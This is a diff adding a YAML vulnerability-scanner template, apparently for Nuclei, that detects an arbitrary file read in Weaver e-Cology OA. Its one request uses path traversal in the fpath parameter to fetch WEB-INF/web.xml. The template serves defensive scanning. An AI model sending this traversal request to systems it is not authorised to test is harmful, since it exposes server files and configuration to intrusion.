@@ -1,0 +1,22 @@
+id: weaver-e-cology-oa-readfile
+info:
+  name: "Weaver e-Cology OA 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Weaver
+  description: |
+    This template detects an arbitrary file read vulnerability in Weaver e-Cology OA systems by attempting to access the web.xml file.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<url-pattern>/weaver/"
